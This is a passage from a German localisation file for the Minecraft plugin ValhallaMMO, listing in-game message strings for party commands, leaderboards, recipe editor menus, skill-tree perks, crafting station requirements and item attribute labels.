    ""status_command_instant_effect_applied"": ""&a%effect% %amplifier% verliehen!"",
    ""status_command_exp_success"": ""&a%player% wurden %amount% %skill% Erfahrung gegeben"",
    ""status_command_saveall_done"": ""&aAlles gespeichert!"",
    ""status_command_levels_redeemed"": ""&a%amount% %skill% Level eingelöst!"",
    ""status_command_exp_redeemed"": ""&a%amount% %skill% Erfahrung eingelöst!"",
    ""status_profiles_loaded"": ""&aDeine Statistiken sind geladen"",
    ""status_crafting_recipe_selected"": ""&7Crafting-Rezept &a%recipe%&7 ausgewählt."",
    ""status_tinkering_recipe_selected"": ""&7Bearbeitungsmethode &a%recipe%&7 ausgewählt."",
    ""status_onetime_crafting_recipe_selected"": ""&7Crafting-Rezept &a%recipe%&7 ausgewählt. Halte Rechtsklick auf den Block, um zu craften!"",
    ""status_onetime_tinkering_recipe_selected"": ""&7Bearbeitungsmethode &a%recipe%&7 ausgewählt. Halte Rechtsklick auf den Block mit &a%item% &7zum Bearbeiten!"",
    ""status_command_import_success"": ""&aRezepte importiert!"",
    ""status_command_resourcepack_downloaded"": ""&aResourcenpaket erfolgreich heruntergeladen! Dateiort plugins/ValhallaMMO/ValhallaMMO_pack.zip"",
    ""status_command_resourcepack_setup"": ""&aResourcenpaket erfolgreich heruntergeladen und installiert! Server neustarten, um Änderungen zu übernehmen"",
    ""status_command_resourcepack_enabled"": ""&aStandard-Ressourcenpaket-Konfiguration aktiviert"",
    ""status_command_resourcepack_disabled"": ""&7Standard-Ressourcenpaket-Konfiguration deaktiviert"",
    ""status_command_item_indexed"": ""&aGegenstand indiziert! ID ist &2%id%"",
    ""status_command_item_removed"": ""&aGegenstand entfernt!"",
    ""status_command_bossbars_hidden"": ""&7Erfahrungsbalken sind jetzt ausgeblendet"",
    ""status_command_bossbars_shown"": ""&7Erfahrungsbalken sind jetzt sichtbar"",
    ""status_command_revealrecipes_enabled"": ""&aDie Namen der gecrafteten Rezepte werden Ihnen jetzt angezeigt"",
    ""status_command_revealrecipes_disabled"": ""&cDie Namen der gecrafteten Rezepte sind Ihnen jetzt verborgen"",
    ""status_command_party_chat_enabled"": ""&aParty-Chat aktiviert"",
    ""status_command_party_chat_disabled"": ""&7Party-Chat deaktiviert"",
    ""status_command_party_created"": ""&aParty erstellt!"",
    ""status_command_party_created_by_admin"": ""&aEine Party mit dem Namen &2%party% &awurde in deinem Namen erstellt"",
    ""status_command_party_invalid_rank"": ""&cRang existiert nicht!"",
    ""status_command_party_member_not_inviteable"": ""&cSpieler kann nicht eingeladen werden"",
    ""status_command_party_forbidden_region"": ""&cNicht erlaubt hier!"",
    ""status_command_party_target_no_party"": ""&cZiel ist in keiner Party"",
    ""status_command_party_sender_no_party"": ""&cDu bist in keiner Party"",
    ""status_command_party_target_higher_rank"": ""&cDu kannst das einem Mitglied mit höherem Rang nicht antun"",
    ""status_command_party_rank_higher_sender"": ""&cDu kannst das mit Rängen nicht tun, die höher oder gleich deinem eigenen sind"",
    ""status_command_party_rank_not_found"": ""&cDieser Rang existiert nicht"",
    ""status_command_party_target_sender_same"": ""&cDu kannst das nicht dir selbst antun"",
    ""status_command_party_sender_not_leader"": ""&cDu musst Anführer der Party sein, um das zu tun"",
    ""status_command_party_sender_no_rank"": ""&cDu hast keinen Rang"",
    ""status_command_party_not_in_same_party"": ""&cDu bist nicht in derselben Party wie dieser Spieler"",
    ""status_command_party_already_in_party"": ""&cDu bist bereits in einer Party"",
    ""status_command_party_not_in_party"": ""&cDu bist in keiner Party"",
    ""status_command_party_party_not_found"": ""&cDie Party konnte nicht gefunden oder wurde gelöscht"",
    ""status_command_party_invalid_stat"": ""&cEs gibt keinen Statistiktyp mit diesem Namen, gültige Statistiken sind %stats%"",
    ""status_command_party_invalid_company_stat"": ""&cEs gibt keine Statistik mit diesem Namen"",
    ""status_command_party_exp_granted"": ""&aErfahrung verliehen!"",
    ""status_command_party_exp_removed"": ""&aErfahrung entfernt!"",
    ""status_command_party_invalid_boolean"": ""&cErwartet true/false/default, aber erhalten %arg%"",
    ""status_command_party_invalid_number"": ""&cErwartet eine Zahl, aber erhalten %arg%"",
    ""status_command_party_party_already_exists"": ""&cParty mit diesem Namen existiert bereits"",
    ""status_command_party_feature_not_unlocked"": ""&cDeine Party hat diese Funktion entweder nicht freigeschaltet oder sie ist deaktiviert"",
    ""status_command_party_cannot_kick_leader"": ""&cDer Anführer kann die Party nicht verlassen, bevor er die Führung überträgt"",
    ""status_command_party_on_cooldown"": ""&cDiese Fähigkeit befindet sich gerade auf Abklingzeit"",
    ""status_command_party_no_item_held"": ""&cDu musst ein Gegenstand halten für Gegenstandstausch"",
    ""status_command_party_character_limit_reached"": ""&cSchriftzeichenlimit überschritten, denk an einen kürzeren Namen/eine kürzere Beschreibung"",
    ""status_command_party_name_not_long_enough"": ""&cName nicht lang genug"",
    ""status_command_party_invalid_characters_used"": ""&cUnzulässige Zeichen verwendet, gültige Zeichen sind: 0-9, a-z, A-Z, &"",
    ""status_command_party_not_invited"": ""&cDu bist nicht zu dieser Party eingeladen >:("",
    ""status_command_party_open"": ""&aParty ist jetzt für jeden offen"",
    ""status_command_party_closed"": ""&7Party ist jetzt für Beitritt geschlossen"",
    ""status_command_party_exp_sharing_enabled"": ""&aParty-Erfahrungsteilung aktiviert"",
    ""status_command_party_exp_sharing_disabled"": ""&7Party-Erfahrungsteilung deaktiviert"",
    ""status_command_party_item_sharing_enabled"": ""&aParty-Gegenstandsteilung aktiviert"",
    ""status_command_party_item_sharing_disabled"": ""&7Party-Gegenstandsteilung deaktiviert"",
    ""status_command_party_friendly_fire_enabled"": ""&aFreundliches Feuer aktiviert"",
    ""status_command_party_friendly_fire_disabled"": ""&aFreundliches Feuer deaktiviert"",
    ""status_command_party_invite_sent"": ""&aEinladung gesendet"",
    ""status_command_party_invite_received"": ""&a%player% hat dich eingeladen %party% beizutreten! Tippe &2/party join %party_id% &aum beizutreten"",
    ""status_command_party_player_kicked"": ""&aSpieler gekickt"",
    ""status_command_party_leadership_transferred"": ""&aFührung übertragen"",
    ""status_command_party_rank_changed"": ""&aRang gesetzt"",
    ""status_command_party_joined"": ""&aParty beigetreten!"",
    ""status_command_party_left"": ""&aParty verlassen"",
    ""status_command_party_item_shared"": ""&aGegenstand geteilt"",
    ""status_command_party_disband_confirmation"": ""&cDies kann nicht rückgängig gemacht werden und der gesamte Fortschritt der Party geht verloren, bist du sicher? &4/party disband confirm"",
    ""status_command_party_disband_confirm_confirmation"": ""&cErnsthaft??? &4/party disband really"",
    ""status_command_party_disbanded"": ""&cParty aufgelöst"",
    ""status_command_party_invites_muted"": ""&aParty-Einladungen stumm"",
    ""status_command_party_invites_unmuted"": ""&aParty-Einladungen sichtbar"",
    ""status_command_party_item_received"": ""&a%player% hat dir %amount%x %item% gesendet!"",
    ""status_command_party_member_cap_reached"": ""&cMitgliederbegrenzung erreicht"",
    ""status_command_party_member_joined"": ""&a%player% ist der Party beigetreten!"",
    ""status_command_party_member_kicked"": ""&cDu wurdest aus der Party entfernt"",
    ""status_command_party_description_updated"": ""&aBeschreibung geändert"",
    ""status_command_party_name_updated"": ""&aName geändert"",
    ""status_command_party_stats_updated"": ""&aStatistiken aktualisiert!"",
    ""status_command_party_spy_enabled"": ""&aParty-Überwachung &2aktiviert"",
    ""status_command_party_spy_disabled"": ""&aParty-Überwachung &2deaktiviert"",
    ""status_command_item_share_outranged"": ""&c%player% ist zu weit entfernt!"",
    ""status_command_parties_disabled"": ""&cParties sind auf diesem Server deaktiviert!"",
    ""leaderboard_power_level"": ""&#ff5640Macht-Level &7(S.%page%)"",
    ""leaderboard_smithing_level"": ""&eSchmieden-Level &7(S.%page%)"",
    ""leaderboard_alchemy_level"": ""&dAlchemie-Level &7(S.%page%)"",
    ""leaderboard_enchanting_level"": ""&bVerzaubern-Level &7(S.%page%)"",
    ""leaderboard_mining_level"": ""&cAbbauen-Level &7(S.%page%)"",
    ""leaderboard_fishing_level"": ""&9Fischen-Level &7(S.%page%)"",
  ""leaderboard_woodcutting_level"": ""&2Holzfällen-Level &7(S.%page%)"",
  ""leaderboard_digging_level"": ""&#753713Graben-Level &7(S.%page%)"",
  ""leaderboard_archery_level"": ""&#00ffaaBogenschießen-Level &7(S.%page%)"",
  ""leaderboard_light_weapons_level"": ""&#ffac40Leichte Waffen-Level &7(S.%page%)"",
  ""leaderboard_heavy_weapons_level"": ""&#ff7640Schwere Waffen-Level &7(S.%page%)"",
  ""leaderboard_light_armor_level"": ""&#ffac40Leichte Rüstung-Level &7(S.%page%)"",
  ""leaderboard_heavy_armor_level"": ""&#ff7640Schwere Rüstung-Level &7(S.%page%)"",
  ""leaderboard_personal_prefix"": ""&7>>> "",
  ""leaderboard_unranked"": ""&7%player% ist noch nicht auf der Bestenliste! "",
  ""perk_forget"": ""&cDu hast %perk% vergessen"",
  ""warning_command_reload"": ""&cVorsicht! Änderungen an Rezepten und Loot-Tabellen werden vor dem Neustart gespeichert und führen zu einem Leistungsabfall. Geben Sie &4/val reload confirm&c ein, um den Neustart wirklich durchzuführen"",
  ""warning_profile_reset"": ""&cWarte! Dieser Reset kann nicht rückgängig gemacht werden und setzt den Fortschritt des Spielers komplett zurück. Führen Sie diesen Befehl erneut aus, um zurückzusetzen, andernfalls läuft die Anfrage in 10 Sekunden ab."",
  ""warning_command_import"": ""&cWarte! Das Importieren von Rezepten kann zu Leistungseinbußen führen, führen Sie diesen Befehl innerhalb von 10 Sekunden erneut aus, um fortzufahren."",
  ""warning_profiles_unloaded"": ""&cDeine Statistiken sind noch nicht geladen"",
  ""warning_item_too_advanced"": ""&cDein &7%item% &cist zu fortgeschritten für dich, bis &7%skill% &cLevel &7%level%"",
  ""description_command_skills"": ""Greift auf den Fertigkeitenbaum des Spielers zu"",
  ""description_command_help"": ""Zeigt eine Liste aller verfügbaren Befehle"",
  ""description_command_recipes"": ""Greift auf den benutzerdefinierten Rezeptmanager von ValhallaMMO zu"",
  ""description_command_reset"": ""Setzt den Fortschritt eines Spielers komplett zurück"",
  ""description_command_profile"": ""Zeigt detaillierte Statistiken zum Fertigkeitenniveau eines Spielers an"",
  ""description_command_exp"": ""Gewährt dir oder einem Spieler eine bestimmte Menge an Fertigkeitenerfahrung"",
  ""description_command_modify"": ""Modifiziert ein gehaltenes Item mit einem Modifikator und einer Stärke"",
  ""description_command_attribute"": ""Wendet ein Attribut auf ein gehaltenes Item an"",
  ""description_command_effect"": ""Gewährt einem Spieler jegliche benutzerdefinierte Tränkewirkung"",
  ""description_command_potionattribute"": ""Wendet eine benutzerdefinierte Tränkewirkung auf das gehaltene Item an"",
  ""description_command_reward"": ""Führt eine Perk-Belohnung mit dem angegebenen Argument auf einen Spieler aus"",
  ""description_command_loot"": ""Greift auf den benutzerdefinierten Loot-Tabellenmanager von ValhallaMMO zu"",
  ""description_command_globalbuff"": ""Fügt globale Effekte hinzu oder entfernt sie, wie beispielsweise erhöhten Erfahrungsgewinn für alle"",
  ""description_command_reload"": ""Lädt alle Konfigurationen neu in den Speicher, &cdieses speichert vorgenommene Änderungen an Rezepten und Loot-Tabellen, was zu einem Leistungsabfall führen kann"",
  ""description_command_givebook"": ""Gibt dir oder anderen Spielern das \""Erste Schritte\""-Buch für ValhallaMMO"",
  ""description_command_import"": ""Importiert alle Rezepte aus einer Datei im Rezeptordner, kann bestehende Rezepte überschreiben oder überspringen."",
  ""description_command_resourcepack"": ""Verwende &edownload &7, um eine Kopie des ValhallaMMO-Ressourcenpakets herunterzuladen, oder &esetup &7, um das Paket herunterzuladen und auf dem Server zu installieren. Dies überschreibt alle Ressourcenanpassungen in server.properties"",
  ""description_command_itemindex"": ""Speichert ein Item unter einer ID, damit es später in Rezeptmodifikatoren verwendet werden kann"",
  ""description_command_hidebossbars"": ""Schaltet die Sichtbarkeit von Boss-Leisten ein oder aus, um den Erfahrungsgewinn für einen Spieler anzuzeigen"",
  ""description_command_revealrecipes"": ""Ermöglicht Ihnen, die genauen Namen der Vanilla-Rezepte anzuzeigen, die Sie erstellen, damit Sie sie in config.yml deaktivieren können"",
  ""description_command_loottables"": ""Ermöglicht Ihnen das Verwalten und Bearbeiten der Loot-Tabellen des Plugins"",
  ""description_command_tool"": ""Ermöglicht es Ihnen, sich eines aus einer begrenzten Auswahl an Werkzeugen mit spezialisierten Zwecken zu geben"",
  ""description_command_saveall"": ""Erzwingt das Speichern des aktuellen Fortschritts"",
  ""description_command_armorsets"": ""Ermöglicht Ihnen das Verwalten und Erstellen neuer Rüstungssätze mit Statusboni. Die Anwendung von Rüstungssätzen auf Gegenstände sollte mit Modifikatoren erfolgen"",
  ""description_command_items"": ""Ermöglicht Ihnen das Hinzufügen benutzerdefinierter Gegenstände zur Gegenstandssammlung des Plugins, für die Verwendung in /val give oder in Modifikatoren"",
  ""description_command_give"": ""Ermöglicht Ihnen, einem Spieler einen Gegenstand aus der Gegenstandssammlung des Plugins, definiert in /val items, zu geben"",
  ""description_command_hardness"": ""Ermöglicht Ihnen, die Standard-Härte von Blocktypen zu ändern"",
  ""status_experience_gained"": ""&7%skill% &7EP &6%exp%"",
  ""status_experience_gained_bossbar"": ""&7%skill% &6%exp_current%&7/&6%exp_next%"",
  ""status_cooldown"": ""&cAbklingzeit: %timestamp%"",
  ""status_economy_cost"": ""&e$%cost%"",
  ""warning_insufficient_money"": ""&cUnzureichende Finanzen"",
  ""status_experience_cost"": ""&a%cost% Erfahrung&7"",
  ""warning_insufficient_experience"": ""&cUnzureichende Erfahrung"",
  ""status_skillpoints_cost"": ""&e%cost% Fertigkeitenpunkte"",
  ""warning_insufficient_skillpoints"": ""&cUnzureichende Fertigkeitenpunkte"",
  ""status_prestigepoints_cost"": ""&d%cost% Prestigepunkte"",
  ""warning_insufficient_prestigepoints"": ""&cUnzureichende Prestigepunkte"",
  ""status_levels_cost"": ""&7&a%cost% Erfahrungslevel"",
  ""warning_insufficient_levels"": ""&cUnzureichende Erfahrungslevel"",
  ""prestige_level_format"": ""&d%prestige_roman%"",
  ""timeformat_days"": ""%days%T, %hours%h"",
  ""timeformat_hours"": ""%hours%h, %minutes%m"",
  ""timeformat_minutes"": ""%minutes%m, %seconds%s"",
  ""timeformat_seconds"": ""%seconds%s"",
  ""ingredient_format_shapeless"": ""&e%amount% &7x &e%ingredient%"",
  ""ingredient_format_grid_shape"": ""&7[&e%characters%&7]"",
  ""ingredient_format_grid_ingredient"": ""&e%character%&7: &e%ingredient%"",
  ""translation_false"": ""Nein"",
  ""translation_true"": ""Ja"",
  ""translation_disables"": ""&cDe-aktiviert"",
  ""translation_enables"": ""&aAktiviert"",
  ""translation_toggles"": ""&aUmschalten"",
  ""menu_loottablefreeselection_guaranteedincluded"": ""&aGarantierte Belohnung!"",
  ""menu_loottablefreeselection_nameformat"": ""&e%quantity%%item%"",
  ""menu_loottablefreeselection_confirmselection"": ""&aBestätigen"",
  ""menu_loottablefreeselection"": ""&8Wähle deine Belohnungen"",
  ""editormenu_customitems"": ""&8Benutzerdefinierte Gegenstände anzeigen"",
  ""editormenu_armorsets"": ""&8Rüstungssätze anzeigen"",
  ""editormenu_recipecategory_craftingtable"": ""&8Arbeitsplatz-Rezepte anzeigen"",
  ""editormenu_recipecategory_brewing"": ""&8Brau-Rezepte anzeigen"",
  ""editormenu_recipecategory_smithing"": ""&8Schmied-Rezepte anzeigen"",
  ""editormenu_recipecategory_furnace"": ""&8Ofen-Rezepte anzeigen"",
  ""editormenu_recipecategory_blastfurnace"": ""&8Hochofen-Rezepte anzeigen"",
  ""editormenu_recipecategory_smoker"": ""&8Räucherofen-Rezepte anzeigen"",
  ""editormenu_recipecategory_campfire"": ""&8Lagerfeuer-Rezepte anzeigen"",
  ""editormenu_recipecategory_immersive"": ""&8Immersive Rezepte anzeigen"",
  ""editormenu_recipecategory_cauldron"": ""&8Kessel-Rezepte anzeigen"",
  ""editormenu_recipecategory_alloy"": ""&8Legierungs-Rezepte anzeigen"",
  ""editormenu_recipecategory_disabled"": ""&8Deaktivierte Rezepte anzeigen"",
  ""editormenu_recipeoverview"": ""&8Rezepttypen"",
  ""editormenu_ingredientselection"": ""&8Zutaten"",
  ""editormenu_validationselection"": ""&8Blockbedingungen"",
  ""editormenu_modifierselection"": ""&8Modifikatoren"",
  ""editormenu_ingredientoptionselection"": ""&8Zutatenoptionen"",
  ""editormenu_gridrecipes"": ""&8Bearbeite %recipe%"",
  ""editormenu_smithingrecipes"": ""&8Bearbeite %recipe%"",
  ""editormenu_cookingrecipes"": ""&8Bearbeite %recipe%"",
  ""editormenu_brewingrecipes"": ""&8Bearbeite %recipe%"",
  ""editormenu_cauldronrecipes"": ""&8Bearbeite %recipe%"",
  ""editormenu_immersiverecipes"": ""&8Bearbeite %recipe%"",
  ""editormenu_alloyrecipes"": ""&8Bearbeite %recipe%"",
  ""editormenu_loottables"": ""&8Bearbeite %table%"",
  ""editormenu_loottableoverview"": ""&8Loot-Tabellen-Kategorie auswählen"",
  ""editormenu_lootpool"": ""Loot-Pool %pool% bearbeiten"",
  ""editormenu_lootentry"": ""Eintrag aus Pool %pool% bearbeiten"",
  ""editormenu_predicateselection"": ""Loot-Filter-Bearbeitung"",
  ""editormenu_statselection"": ""Attribut-Bearbeitung"",
  ""editormenu_blocktables"": ""Loot-Filter-Bearbeitung"",
  ""editormenu_entitytables"": ""Loot-Filter-Bearbeitung"",
  ""editormenu_containertables"": ""Loot-Filter-Bearbeitung"",
  ""editormenu_fishingtable"": ""Loot-Filter-Bearbeitung"",
  ""skilltree"": ""&7Fertigkeiten"",
  ""skilltree_arrow_name_n"": ""&fNach oben"",
  ""skilltree_arrow_name_ne"": ""&fNach oben-rechts"",
  ""skilltree_arrow_name_e"": ""&fNach rechts"",
  ""skilltree_arrow_name_se"": ""&fNach unten-rechts"",
  ""skilltree_arrow_name_s"": ""&fNach unten"",
  ""skilltree_arrow_name_sw"": ""&fNach unten-links"",
  ""skilltree_arrow_name_w"": ""&fNach links"",
  ""skilltree_arrow_name_nw"": ""&fNach oben-links"",
  ""skilltree_perk_confirmation"": ""&fMöchtest du %perk% &ffreischalten?"",
  ""warning_not_enough_skillpoints"": ""&cNicht genügend Fertigkeitenpunkte"",
  ""perk_format_requirement_one"": ""&7Erforderlich:"",
  ""perk_format_requirement_all"": ""&7Erforderlich:"",
  ""perk_format_requirement"": ""&7- %perk_required%"",
  ""perk_other_level_requirement"": ""&7            %skill% &7Lvl&e%level_required%"",
  ""perk_format_separator"": ""&8&m                               "",
  ""perk_requirement_warning_levels"": ""&cUnzureichendes Level"",
  ""perk_requirement_warning_perks"": ""&cBenötigte Perks nicht freigeschaltet"",
  ""perk_requirement_warning_outdated"": ""&cDiese Perk ist in dieser Version nicht funktionsfähig!"",
  ""perk_requirement_status_unlockable"": ""&aKlicke, um diese Perk freizuschalten"",
  ""perk_requirement_status_unlocked"": ""&aPerk freigeschaltet"",
  ""perk_requirement_status_permanently_locked"": ""&ePerk kann nicht mehr freigeschaltet werden"",
  ""perk_requirement_status_fake_unlocked"": ""&aPerk freigeschaltet"",
  ""max_level"": ""MAX"",
  ""format_signature"": ""&8- %player%"",
  ""translation_durability"": ""&7Haltbarkeit:"",
  ""damage_indicator_crit"": ""&4KRIT!"",
  ""modifier_warning_insufficient_funds"": ""&cDie Herstellung dieses Gegenstands kostet %quantity%x%cost%$"",
  ""modifier_warning_insufficient_exp"": ""&cDie Herstellung dieses Gegenstands kostet %quantity%x%cost% EP"",
  ""modifier_warning_counter_exceeded"": ""&cNicht genügend verbleibende Upgradefelder"",
  ""modifier_warning_counter_exceeded_player_cap"": ""&cDu kannst derzeit keine weiteren Upgradefelder hinzufügen"",
  ""modifier_warning_counter_exceeded_item_cap"": ""&cDas Gegenstandsupgrade-Limit wurde erreicht"",
  ""modifier_warning_forbidden_potion_type"": ""&cFalsche Art von Trank!"",
  ""modifier_warning_required_potion_type"": ""&cFalsche Art von Trank!"",
  ""modifier_warning_forbidden_alchemy_tag"": ""&cAlchemie-Vorbedingungen nicht erfüllt!"",
  ""modifier_warning_required_alchemy_tag"": ""&cAlchemie-Vorbedingungen nicht erfüllt!"",
  ""modifier_warning_forbidden_smithing_tag"": ""&cVorbedingungen nicht erfüllt!"",
  ""modifier_warning_required_smithing_tag"": ""&cVorbedingungen nicht erfüllt!"",
  ""modifier_warning_no_invertible_effects"": ""&cKeine invertierbaren Effekte!"",
  ""validation_warning_not_above_hot_block"": ""&cWasser ist nicht kochend"",
  ""validation_warning_not_waterlogged"": ""&cMuss wassergefüllt sein"",
  ""validation_warning_waterlogged"": ""&cKann nicht wassergefüllt sein"",
  ""validation_warning_campfire_unlit"": ""&cMuss entzündet sein"",
  ""validation_warning_campfire_lit"": ""&cMuss gelöscht sein"",
  ""validation_warning_not_full_enough"": ""&cKessel ist leer"",
  ""validation_warning_full"": ""&cKessel ist voll"",
  ""validation_warning_not_surrounded_by_stone_brick"": ""&cSteinziegelofen erforderlich"",
  ""validation_warning_not_surrounded_by_brick"": ""&cZiegelofen erforderlich"",
  ""validation_warning_not_surrounded_by_deepslate_brick"": ""&cTiefseeplattenofen erforderlich"",
  ""validation_warning_not_surrounded_by_nether_brick"": ""&cNetherziegel-ofen erforderlich"",
  ""validation_warning_not_surrounded_by_blackstone_brick"": ""&cBlacksteinziegelofen erforderlich"",
  ""validation_warning_not_surrounded_by_end_brick"": ""&cEndsteinziegelofen erforderlich"",
  ""validation_warning_stone_or_better_required"": ""&cTier-II-Ofen erforderlich"",
  ""validation_warning_brick_or_better_required"": ""&cTier-III-Ofen erforderlich"",
  ""validation_warning_deepslate_or_better_required"": ""&cTier-IV-Ofen erforderlich"",
  ""validation_warning_nether_or_better_required"": ""&cTier-V-Ofen erforderlich"",
  ""validation_warning_blackstone_or_better_required"": ""&cTier-VI-Ofen erforderlich"",
  ""validation_warning_end_or_better_required"": ""&cTier-VII-Ofen erforderlich"",
  ""validation_warning_anvil_nearby_required"": ""&cErfordert einen Amboss in der Nähe"",
  ""validation_warning_smithingtable_nearby_required"": ""&cErfordert einen Schmiedetisch in der Nähe"",
  ""validation_warning_craftingtable_nearby_required"": ""&cErfordert einen Arbeitstisch in der Nähe"",
  ""validation_warning_fletchingtable_nearby_required"": ""&cErfordert einen Bolzentisch in der Nähe"",
  ""validation_warning_cauldron_nearby_required"": ""&cErfordert einen Kessel in der Nähe"",
  ""validation_warning_brewingstand_nearby_required"": ""&cErfordert einen Braustand in der Nähe"",
  ""validation_warning_grindstone_nearby_required"": ""&cErfordert einen Schleifstein in der Nähe"",
  ""validation_warning_stonecutter_nearby_required"": ""&cErfordert einen Steinmetz in der Nähe"",
  ""validation_warning_cartographytable_nearby_required"": ""&cErfordert einen Kartentisch in der Nähe"",
  ""validation_warning_loom_nearby_required"": ""&cErfordert einen Webstuhl in der Nähe"",
  ""validation_warning_lectern_nearby_required"": ""&cErfordert einen Lesepult in der Nähe"",
  ""validation_warning_composter_nearby_required"": ""&cErfordert einen Komposter in der Nähe"",
  ""validation_warning_campfire_nearby_required"": ""&cErfordert ein Lagerfeuer in der Nähe"",
  ""validation_warning_soulcampfire_nearby_required"": ""&cErfordert ein Seelenlagerfeuer in der Nähe"",
  ""validation_warning_furnace_nearby_required"": ""&cErfordert einen Ofen in der Nähe"",
  ""validation_warning_smoker_nearby_required"": ""&cErfordert einen Räucherofen in der Nähe"",
  ""validation_warning_blastfurnace_nearby_required"": ""&cErfordert einen Hochofen in der Nähe"",
  ""validation_warning_enchantmenttable_nearby_required"": ""&cErfordert einen Verzauberungstisch in der Nähe"",
  ""validation_warning_beacon_nearby_required"": ""&cErfordert einen Leuchtturm in der Nähe"",
  ""validation_warning_candle_nearby_required"": ""&cErfordert eine Kerze in der Nähe"",
  ""validation_warning_water_nearby_required"": ""&cErfordert Wasser in der Nähe"",
  ""validation_warning_lava_nearby_required"": ""&cErfordert Lava in der Nähe"",
  
  ""attribute_bow_strength"": ""%icon%%value% Bogenkraft"",
  ""attribute_arrow_damage"": ""%icon%%value% Pfeilschaden"",
  ""attribute_ammo_consumption"": ""%icon%%value% Munitionsverbrauch"",
  ""attribute_arrow_velocity"": ""%icon%%value% Pfeilgeschwindigkeit"",
  ""attribute_arrow_accuracy"": ""%icon%%value% Genauigkeit"",
  ""attribute_arrow_piercing"": ""%icon%%value% Durchschlagskraft"",
  ""attribute_knockback"": ""%icon%%value% Rückstoß"",
  ""attribute_stun_chance"": ""%icon%%value% Betäubungswahrscheinlichkeit"",
  ""attribute_bleed_chance"": ""%icon%%value% Blutverlust-Chance"",
  ""attribute_bleed_damage"": ""%icon%%value% Blutverlust-Schaden"",
  ""attribute_bleed_duration"": ""%icon%%value% Blutverlust-Dauer"",
  ""attribute_crit_chance"": ""%icon%%value% Krit-Chance"",
  ""attribute_crit_damage"": ""%icon%%value% Krit-Schaden"",
  ""attribute_armor_penetration_flat"": ""%icon%%value% Rüstungsdurchdringung"",
  ""attribute_light_armor_penetration_flat"": ""%icon%%value% Leichte Rüstungsdurchdringung"",
  ""attribute_heavy_armor_penetration_flat"": ""%icon%%value% Schwere Rüstungsdurchdringung"",
  ""attribute_armor_penetration_fraction"": ""%icon%%value% Rüstungsdurchdringung"",
  ""attribute_light_armor_penetration_fraction"": ""%icon%%value% Leichte Rüstungsdurchdringung"",
  ""attribute_heavy_armor_penetration_fraction"": ""%icon%%value% Schwere Rüstungsdurchdringung"",
  ""attribute_heavy_armor_damage"": ""%icon%%value% Schaden gegen schwere Rüstung"",
  ""attribute_light_armor_damage"": ""%icon%%value% Schaden gegen leichte Rüstung"",
  ""attribute_immunity_bonus_fraction"": ""%icon%%value% Immunität"",
  ""attribute_immunity_bonus_flat"": ""%icon%%value% Immunität"",
  ""attribute_immunity_reduction"": ""%icon%%value% Immunitätsreduktion"",
  ""attribute_damage_unarmed"": ""%icon%%value% Unbewaffneter Schaden"",
  ""attribute_damage_melee"": ""%icon%%value% Nahkampfschaden"",
  ""attribute_damage_ranged"": ""%icon%%value% Fernkampfschaden"",
  ""attribute_damage_all"": ""%icon%%value% Schaden"",
  ""attribute_attack_reach"": ""%icon%%value% Angriffsreichweite"",
  ""attribute_velocity_damage"": ""%icon%%value% Stoßschaden"",
  ""attribute_dismount_chance"": ""%icon%%value% Abwurf-Wahrscheinlichkeit"",
  ""attribute_damage_resistance"": ""%icon%%value% Schadensresistenz"",
  ""attribute_explosion_resistance"": ""%icon%%value% Explosionsresistenz"",
  ""attribute_fall_damage_resistance"": ""%icon%%value% Fallschadenresistenz"",
  ""attribute_fire_resistance"": ""%icon%%value% Feuerresistenz"",
  ""attribute_magic_resistance"": ""%icon%%value% Magieresistenz"",
  ""attribute_bleed_resistance"": ""%icon%%value% Blutungen-Resistenz"",
  ""attribute_stun_resistance"": ""%icon%%value% Betäubungsresistenz"",
  ""attribute_poison_resistance"": ""%icon%%value% Giftresistenz"",
  ""attribute_projectile_resistance"": ""%icon%%value% Projektilresistenz"",
  ""attribute_melee_resistance"": ""%icon%%value% Nahkampfresistenz"",
  ""attribute_bludgeoning_resistance"": ""%icon%%value% Stumpfresistenz"",
  ""attribute_lightning_resistance"": ""%icon%%value% Blitzresistenz"",
  ""attribute_freezing_resistance"": ""%icon%%value% Kälteresistenz"",
  ""attribute_radiant_resistance"": ""%icon%%value% Strahlungsresistenz"",
  ""attribute_necrotic_resistance"": ""%icon%%value% Nekrose-Resistenz"",
  ""attribute_crit_chance_resistance"": ""%icon%%value% Krit-Chance-Resistenz"",
  ""attribute_crit_damage_resistance"": ""%icon%%value% Krit-Schaden-Resistenz"",
  ""attribute_dodge_chance"": ""%icon%%value% Ausweichwahrscheinlichkeit"",
  ""attribute_healing_bonus"": ""%icon%%value% Heilung"",
  ""attribute_food_consumption"": ""%icon%%value% Nahrungsverbrauch"",
  ""attribute_cooldown_reduction"": ""%icon%%value% Abklingzeitverkürzung"",
  ""attribute_explosion_power"": ""%icon%%value% TNT-Kraft"",
  ""attribute_crafting_speed"": ""%icon%%value% Fertigungsgeschwindigkeit"",
  ""attribute_alchemy_quality"": ""%icon%%value% Alchemie-Fertigkeit"",
  ""attribute_alchemy_quality_fraction"": ""%icon%%value% Alchemie-Fertigkeit"",
  ""attribute_enchanting_quality"": ""%icon%%value% Verzauberungsfertigkeit"",
  ""attribute_enchanting_quality_fraction"": ""%icon%%value% Verzauberungsfertigkeit"",
  ""attribute_anvil_quality_flat"": ""%icon%%value% Amboss-Fertigkeit"",
  ""attribute_anvil_quality_fraction"": ""%icon%%value% Amboss-Fertigkeit"",
  ""attribute_brewing_ingredient_consumption"": ""%icon%%value% Brau-Zutatenverbrauch"",
  ""attribute_brewing_speed"": ""%icon%%value% Braugeschwindigkeit"",
  ""attribute_potion_consumption"": ""%icon%%value% Tränkeverbrauch"",
  ""attribute_throwing_velocity"": ""%icon%%value% Wurfgeschwindigkeit"",
  ""attribute_smithing_quality"": ""%icon%%value% Schmiedefertigkeit"",
  ""attribute_smithing_quality_fraction"": ""%icon%%value% Schmiedefertigkeit"",
  ""attribute_mining_rare_drops"": ""%icon%%value% Abbauglück"",
  ""attribute_mining_drops"": ""%icon%%value% Abbauausbeute"",
  ""attribute_woodcutting_rare_drops"": ""%icon%%value% Holzfällerglück"",
  ""attribute_woodcutting_drops"": ""%icon%%value% Holzfällerausbeute"",
  ""attribute_digging_rare_drops"": ""%icon%%value% Grabeglück"",
  ""attribute_digging_drops"": ""%icon%%value% Grabausbeute"",
  ""attribute_farming_rare_drops"": ""%icon%%value% Landwirtschaft-Glück"",
  ""attribute_farming_drops"": ""%icon%%value% Landwirtschaftsausbeute"",
  ""attribute_fishing_luck"": ""%icon%%value% Angel-Glück"",
  ""attribute_skill_exp_gain"": ""%icon%%value% Fertigkeiten-EP"",
